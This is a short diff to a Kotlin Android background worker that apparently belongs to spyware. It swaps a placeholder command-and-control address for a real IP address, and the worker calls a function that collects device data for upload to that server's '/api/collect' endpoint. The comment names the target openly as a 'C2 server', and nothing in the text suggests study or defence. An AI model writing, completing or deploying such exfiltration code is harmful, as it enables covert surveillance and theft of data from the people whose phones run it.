@@ -18,7 +18,7 @@ class DataUploadWorker(context: Context, params: WorkerParameters) : Worker(cont
     private val client = OkHttpClient()
     private val gson = Gson()
     // Replace with your C2 server IP/domain
-    private val C2_URL = "http://YOUR_C2_IP:5000/api/collect"
+    private val C2_URL = "http://100.102.225.113:5000/api/collect"
 
     override fun doWork(): Result {
         val data = collectAllData()
